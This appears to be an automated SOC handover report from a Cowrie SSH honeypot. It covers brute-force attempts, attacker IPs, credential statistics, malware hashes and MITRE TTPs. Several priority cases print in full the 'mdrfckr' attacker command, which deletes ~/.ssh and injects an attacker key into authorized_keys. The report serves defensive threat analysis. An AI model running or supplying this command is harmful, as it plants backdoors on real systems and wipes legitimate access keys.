# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-03-23 |
| **Generated At** | 2026-03-23T05:29:41Z |
| **Shift Time** | 05:29 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · AWS EC2 · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **116** |
| Confirmed Threats | **90** |
| False Positives Filtered | **26** (22.4%) |
| Unique Attacker IPs | **34** |
| Countries of Origin | **16** |
| High Severity Cases | **8** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **108** |
| Malware Samples Analyzed | **0** HIGH · **6** MED · 1 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **68** |
| Unique Credential Pairs | **61** |
| Unique Usernames | **54** |
| Unique Passwords | **47** |
| Successful Auth Pairs | **7** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `root` | 8 |
| `nobody` | 4 |
| `345gs5662d34` | 4 |
| `supervisor` | 2 |
| `operator` | 1 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `password` | 6 |
| `12345678` | 6 |
| `345gs5662d34` | 4 |
| `3245gs5662d34` | 4 |
| `12345` | 3 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `345gs5662d34` | `345gs5662d34` | 4 |
| `root` | `3245gs5662d34` | 4 |
| `root` | `1234!@#$` | 2 |
| `operator` | `operator2001` | 1 |
| `nobody` | `admin` | 1 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `root` | `1234!@#$` | `186.248.197.77` | 2026-03-23T04:31:26 |
| `root` | `3245gs5662d34` | `186.248.197.77` | 2026-03-23T04:31:35 |
| `root` | `Abc123...` | `8.219.94.137` | 2026-03-23T04:39:40 |
| `root` | `3245gs5662d34` | `8.219.94.137` | 2026-03-23T04:39:43 |
| `root` | `1234!@#$` | `8.219.94.137` | 2026-03-23T04:47:53 |
| `root` | `@Pass123` | `118.193.39.127` | 2026-03-23T05:09:56 |
| `root` | `3245gs5662d34` | `118.193.39.127` | 2026-03-23T05:09:59 |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **1** |
| Campaign Clusters | **1** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 4 | 3 | `T1021.004, T1078, T1070, T1140` |

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
Source IPs: `118.193.39.127`, `186.248.197.77`, `8.219.94.137`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **34** |
| Unique ASNs | **29** |
| High-Risk ASNs | **25** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS45102` | Alibaba (US) Technology Co., Ltd. | 3 | HIGH |
| `AS4811` | China Telecom (Group) | 2 | HIGH |
| `AS45899` | VNPT Corp | 2 | HIGH |
| `AS4134` | CHINANET-BACKBONE | 2 | HIGH |
| `AS4760` | HKT Limited | 1 | HIGH |
| `AS23106` | AMERICAN TOWER DO BRASIL-COMUNICAÇÂO MULTIMÍDIA LT | 1 | HIGH |
| `AS3816` | COLOMBIA TELECOMUNICACIONES S.A. ESP BIC | 1 | HIGH |
| `AS7506` | GMO Internet Group, Inc. | 1 | HIGH |

---

---

## 🚨 Priority Cases — Immediate Attention (8)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-1b4f88f3d2a0

| Field | Detail |
|---|---|
| **Source IP** | `186.248.197[.]77` |
| **First Seen** | 2026-03-23 04:31 |
| **Last Seen** | 2026-03-23 04:31 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-23 04:31:24` | `cowrie.session.connect` |
| `2026-03-23 04:31:24` | `cowrie.client.version` |
| `2026-03-23 04:31:25` | `cowrie.client.kex` |
| `2026-03-23 04:31:26` | `cowrie.login.success` |
| `2026-03-23 04:31:27` | `cowrie.session.params` |
| `2026-03-23 04:31:27` | `cowrie.command.input` |
| `2026-03-23 04:31:27` | `cowrie.command.failed` |
| `2026-03-23 04:31:27` | `cowrie.log.closed` |
| `2026-03-23 04:31:28` | `cowrie.session.params` |
| `2026-03-23 04:31:28` | `cowrie.command.input` |
| `2026-03-23 04:31:29` | `cowrie.session.file_download` |
| `2026-03-23 04:31:29` | `cowrie.log.closed` |
| `2026-03-23 04:31:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `186.248.197[.]77` to AbuseIPDB if not already reported
- [ ] Block `186.248.197[.]77` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-144f62f81322

| Field | Detail |
|---|---|
| **Source IP** | `186.248.197[.]77` |
| **First Seen** | 2026-03-23 04:31 |
| **Last Seen** | 2026-03-23 04:31 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-23 04:31:33` | `cowrie.session.connect` |
| `2026-03-23 04:31:33` | `cowrie.client.version` |
| `2026-03-23 04:31:33` | `cowrie.client.kex` |
| `2026-03-23 04:31:35` | `cowrie.login.success` |
| `2026-03-23 04:31:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `186.248.197[.]77` to AbuseIPDB if not already reported
- [ ] Block `186.248.197[.]77` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-dbad4fa9aced

| Field | Detail |
|---|---|
| **Source IP** | `8.219.94[.]137` |
| **First Seen** | 2026-03-23 04:39 |
| **Last Seen** | 2026-03-23 04:39 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-23 04:39:40` | `cowrie.session.connect` |
| `2026-03-23 04:39:40` | `cowrie.client.version` |
| `2026-03-23 04:39:40` | `cowrie.client.kex` |
| `2026-03-23 04:39:40` | `cowrie.login.success` |
| `2026-03-23 04:39:41` | `cowrie.session.params` |
| `2026-03-23 04:39:41` | `cowrie.command.input` |
| `2026-03-23 04:39:41` | `cowrie.command.failed` |
| `2026-03-23 04:39:41` | `cowrie.log.closed` |
| `2026-03-23 04:39:41` | `cowrie.session.params` |
| `2026-03-23 04:39:41` | `cowrie.command.input` |
| `2026-03-23 04:39:41` | `cowrie.session.file_download` |
| `2026-03-23 04:39:41` | `cowrie.log.closed` |
| `2026-03-23 04:39:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `8.219.94[.]137` to AbuseIPDB if not already reported
- [ ] Block `8.219.94[.]137` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e9fffd01b9bd

| Field | Detail |
|---|---|
| **Source IP** | `8.219.94[.]137` |
| **First Seen** | 2026-03-23 04:39 |
| **Last Seen** | 2026-03-23 04:39 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-23 04:39:43` | `cowrie.session.connect` |
| `2026-03-23 04:39:43` | `cowrie.client.version` |
| `2026-03-23 04:39:43` | `cowrie.client.kex` |
| `2026-03-23 04:39:43` | `cowrie.login.success` |
| `2026-03-23 04:39:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `8.219.94[.]137` to AbuseIPDB if not already reported
- [ ] Block `8.219.94[.]137` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-65811801093c

| Field | Detail |
|---|---|
| **Source IP** | `8.219.94[.]137` |
| **First Seen** | 2026-03-23 04:47 |
| **Last Seen** | 2026-03-23 04:47 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-23 04:47:53` | `cowrie.session.connect` |
| `2026-03-23 04:47:53` | `cowrie.client.version` |
| `2026-03-23 04:47:53` | `cowrie.client.kex` |
| `2026-03-23 04:47:53` | `cowrie.login.success` |
| `2026-03-23 04:47:53` | `cowrie.session.params` |
| `2026-03-23 04:47:53` | `cowrie.command.input` |
| `2026-03-23 04:47:53` | `cowrie.command.failed` |
| `2026-03-23 04:47:54` | `cowrie.log.closed` |
| `2026-03-23 04:47:54` | `cowrie.session.params` |
| `2026-03-23 04:47:54` | `cowrie.command.input` |
| `2026-03-23 04:47:54` | `cowrie.session.file_download` |
| `2026-03-23 04:47:54` | `cowrie.log.closed` |
| `2026-03-23 04:47:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `8.219.94[.]137` to AbuseIPDB if not already reported
- [ ] Block `8.219.94[.]137` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8347064b72da

| Field | Detail |
|---|---|
| **Source IP** | `8.219.94[.]137` |
| **First Seen** | 2026-03-23 04:47 |
| **Last Seen** | 2026-03-23 04:47 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-23 04:47:55` | `cowrie.session.connect` |
| `2026-03-23 04:47:55` | `cowrie.client.version` |
| `2026-03-23 04:47:55` | `cowrie.client.kex` |
| `2026-03-23 04:47:56` | `cowrie.login.success` |
| `2026-03-23 04:47:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `8.219.94[.]137` to AbuseIPDB if not already reported
- [ ] Block `8.219.94[.]137` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-68278cf77d6c

| Field | Detail |
|---|---|
| **Source IP** | `118.193.39[.]127` |
| **First Seen** | 2026-03-23 05:09 |
| **Last Seen** | 2026-03-23 05:09 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-23 05:09:56` | `cowrie.session.connect` |
| `2026-03-23 05:09:56` | `cowrie.client.version` |
| `2026-03-23 05:09:56` | `cowrie.client.kex` |
| `2026-03-23 05:09:56` | `cowrie.login.success` |
| `2026-03-23 05:09:56` | `cowrie.session.params` |
| `2026-03-23 05:09:56` | `cowrie.command.input` |
| `2026-03-23 05:09:56` | `cowrie.command.failed` |
| `2026-03-23 05:09:56` | `cowrie.log.closed` |
| `2026-03-23 05:09:57` | `cowrie.session.params` |
| `2026-03-23 05:09:57` | `cowrie.command.input` |
| `2026-03-23 05:09:57` | `cowrie.session.file_download` |
| `2026-03-23 05:09:57` | `cowrie.log.closed` |
| `2026-03-23 05:09:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `118.193.39[.]127` to AbuseIPDB if not already reported
- [ ] Block `118.193.39[.]127` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6961d7a78f63

| Field | Detail |
|---|---|
| **Source IP** | `118.193.39[.]127` |
| **First Seen** | 2026-03-23 05:09 |
| **Last Seen** | 2026-03-23 05:09 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-23 05:09:59` | `cowrie.session.connect` |
| `2026-03-23 05:09:59` | `cowrie.client.version` |
| `2026-03-23 05:09:59` | `cowrie.client.kex` |
| `2026-03-23 05:09:59` | `cowrie.login.success` |
| `2026-03-23 05:09:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `118.193.39[.]127` to AbuseIPDB if not already reported
- [ ] Block `118.193.39[.]127` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `47.237.10[.]247` | **15** | 2026-03-23 04:33 | 2026-03-23 04:49 | 0m | 15 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `8.219.94[.]137` | **15** | 2026-03-23 04:36 | 2026-03-23 04:49 | 0m | 15 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `183.66.149[.]42` | **8** | 2026-03-23 02:41 | 2026-03-23 02:57 | 10m | 3 | `T1110.001 · T1592` | 🟢 LOW |
| `14.103.122[.]215` | **7** | 2026-03-23 02:44 | 2026-03-23 02:51 | 14m | 0 | `T1592` | 🟢 LOW |
| `179.32.33[.]161` | **7** | 2026-03-23 05:11 | 2026-03-23 05:27 | 0m | 7 | `T1110.001 · T1592` | 🟢 LOW |
| `16.58.56[.]214` | **5** | 2026-03-23 04:06 | 2026-03-23 04:14 | 0m | 0 | `T1592` | 🟢 LOW |
| `220.246.46[.]144` | **2** | 2026-03-23 03:47 | 2026-03-23 04:30 | 0m | 2 | `T1110.001 · T1592` | 🟢 LOW |
| `102.90.34[.]90` | 1 | 2026-03-23 05:26 | 2026-03-23 05:28 | 120s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `110.37.71[.]14` | 1 | 2026-03-23 04:17 | 2026-03-23 04:18 | 14s | 0 | `T1592` | 🟢 LOW |
| `111.4.120[.]19` | 1 | 2026-03-23 04:03 | 2026-03-23 04:03 | 4s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `113.160.140[.]138` | 1 | 2026-03-23 02:39 | 2026-03-23 02:40 | 4s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `118.193.39[.]127` | 1 | 2026-03-23 05:09 | 2026-03-23 05:09 | 1s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `123.24.206[.]213` | 1 | 2026-03-23 04:58 | 2026-03-23 04:59 | 16s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `14.103.149[.]158` | 1 | 2026-03-23 04:22 | 2026-03-23 04:22 | 1s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `160.251.101[.]169` | 1 | 2026-03-23 03:16 | 2026-03-23 03:16 | 1s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `175.180.129[.]87` | 1 | 2026-03-23 02:32 | 2026-03-23 02:32 | 3s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `178.178.194[.]192` | 1 | 2026-03-23 05:17 | 2026-03-23 05:17 | 3s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `181.205.51[.]98` | 1 | 2026-03-23 04:05 | 2026-03-23 04:05 | 4s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `186.248.197[.]77` | 1 | 2026-03-23 04:31 | 2026-03-23 04:31 | 3s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `190.90.79[.]26` | 1 | 2026-03-23 02:58 | 2026-03-23 02:58 | 3s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `194.195.210[.]47` | 1 | 2026-03-23 04:32 | 2026-03-23 04:32 | 0s | 0 | `T1592` | 🟢 LOW |
| `219.147.196[.]170` | 1 | 2026-03-23 04:28 | 2026-03-23 04:30 | 120s | 0 | `T1592` | 🟢 LOW |
| `34.81.42[.]153` | 1 | 2026-03-23 04:15 | 2026-03-23 04:15 | 1s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `46.210.95[.]5` | 1 | 2026-03-23 03:10 | 2026-03-23 03:10 | 3s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `51.158.203[.]149` | 1 | 2026-03-23 02:56 | 2026-03-23 02:57 | 30s | 0 | `T1592` | 🟢 LOW |
| `60.116.115[.]158` | 1 | 2026-03-23 04:49 | 2026-03-23 04:49 | 4s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `8.210.214[.]44` | 1 | 2026-03-23 04:58 | 2026-03-23 04:58 | 8s | 0 | `T1592` | 🟢 LOW |
| `85.30.248[.]213` | 1 | 2026-03-23 04:42 | 2026-03-23 04:42 | 2s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `90.230.226[.]175` | 1 | 2026-03-23 04:11 | 2026-03-23 04:12 | 3s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `92.255.196[.]185` | 1 | 2026-03-23 02:34 | 2026-03-23 02:34 | 3s | 1 | `T1110.001 · T1592` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (11 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/76 ✅ |
| `17b7944a9b8a4e3edb1b1f2e743ae5d06dae0a8c3a9531e94970aa3261c2cab5` | ELF Binary (Linux executable) (x86-64 64-bit) | `17b7944a9b8a4e3e...` | 45/100 | 🟡 MEDIUM | **38/76** 🔴 |
| `77c2e7968f7695c1bfbe08f0c455cc95479a74cc7fdb432667e29bab08515ce1` | ELF Binary (Linux executable) (ARM 32-bit) | `77c2e7968f7695c1...` | 30/100 | 🟢 LOW | Not in VT |
| `7a9da7d10aa80b0f9e2e3f9e518030c86026a636e0b6de35905e15dd4c8e3e2d` | ELF Binary (Linux executable) (x86-64 64-bit) | `7a9da7d10aa80b0f...` | 45/100 | 🟡 MEDIUM | **39/76** 🔴 |
| `98babd858ec296d43844c96d53ff8713c44a451ba6e05b89d64c772828a0514d` | ELF Binary (Linux executable) (x86-64 64-bit) | `98babd858ec296d4...` | 44/100 | 🟡 MEDIUM | **37/76** 🔴 |
| `a04ac6d98ad989312783d4fe3456c53730b212c79a426fb215708b6c6daa3de3` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 48/100 | 🟡 MEDIUM | **46/76** 🔴 |
| `a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2` | Unknown binary | `a8460f446be54041...` | 11/100 | 🟢 LOW | **29/76** 🔴 |
| `e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `e99df510c24950e447f6a471be7fb1b1f7716b0e882005db3511327cbc27b9ff` | ELF Binary (Linux executable) (ARM 32-bit) | `e99df510c24950e4...` | 30/100 | 🟢 LOW | 0/72 ✅ |
| `f200744b6900aeb0a27df08c71fc28a7f07b0aee21e844beca214eb8c4ab58dd` | ELF Binary (Linux executable) (x86-64 64-bit) | `f200744b6900aeb0...` | 43/100 | 🟡 MEDIUM | **34/76** 🔴 |
| `tmpzmvvpi6d` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 48/100 | 🟡 MEDIUM | **46/76** 🔴 |

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `110.37.71[.]14` | PK | National Wimax/IMS environment | **100** ⚠️ | 2 |
| `60.116.115[.]158` | JP | Japan Nation-wide Network of Softbank Corp. | **100** ⚠️ | 11 |
| `85.30.248[.]213` | RU | PJSC Rostelecom | **100** ⚠️ | 37 |
| `51.158.203[.]149` | NL | Scaleway - Amsterdam, Netherlands | **100** ⚠️ | 2 |
| `90.230.226[.]175` | SE | Telia Network Services | **100** ⚠️ | 8 |
| `92.255.196[.]185` | RU | CJSC Company ER-Telecom Kazan' | **100** ⚠️ | 50 |
| `118.193.39[.]127` | HK | UCLOUD INFORMATION TECHNOLOGY (HK) LIMITED | **100** ⚠️ | 50 |
| `194.195.210[.]47` | US | Linode, LLC | **100** ⚠️ | 50 |
| `102.90.34[.]90` | NG | MTN Nigeria | **100** ⚠️ | 50 |
| `186.248.197[.]77` | BR | AMERICAN TOWER DO BRASIL-COMUNICAÇÂO MULTIMÍDIA LT | **100** ⚠️ | 50 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1592](https://attack.mitre.org/techniques/T1592) | 85 |
| [T1110.001](https://attack.mitre.org/techniques/T1110/001) | 60 |
| [T1078](https://attack.mitre.org/techniques/T1078) | 8 |
| [T1021.004](https://attack.mitre.org/techniques/T1021/004) | 4 |
| [T1105](https://attack.mitre.org/techniques/T1105) | 4 |

---

## 🔕 False Positive Summary (26 filtered)

| Reason | Count |
|---|---|
| AbuseIPDB score 19 below threshold 25 | 4 |
| AbuseIPDB score 3 below threshold 25 | 20 |
| AbuseIPDB score 8 below threshold 25 | 1 |
| Mass-scanner pattern: no commands, no downloads, ≤2 login attempts | 1 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 116 cases |
| Tool 34  | Credential Extractor        | ✅ 68 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 0 fingerprints |
| Tool 36  | Command Clustering          | ✅ 1 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 34 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 26 filtered (22.4%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 29 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 11 files |
| Tool 33  | YARA Classifier             | ✅ 4 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 8 priority case(s) shown individually · 30 recon entry/entries in table (7 group(s) consolidating 59 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `nikhilsalunkemumbai/thir-live` · Cowrie SSH Honeypot · AWS EC2_  
_Report time: 2026-03-23T05:29:41Z_
